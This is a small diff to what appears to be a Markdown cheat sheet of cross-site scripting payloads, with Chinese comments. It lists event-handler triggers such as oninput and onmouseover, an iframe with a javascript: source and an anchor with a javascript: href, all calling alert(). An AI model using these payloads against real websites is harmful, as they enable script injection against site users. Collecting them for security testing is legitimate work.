@@ -28,8 +28,7 @@ oninput=alert() //在用户输入时触发
 onmouseover=alert()//鼠标移动到就会触发
 
 
-```
-	 <iframe src=javascript:alert('xss')></iframe>```
+```<iframe src=javascript:alert('xss')></iframe>```
 
 
 ```<a href=javascript:alert(1)>test</a>```
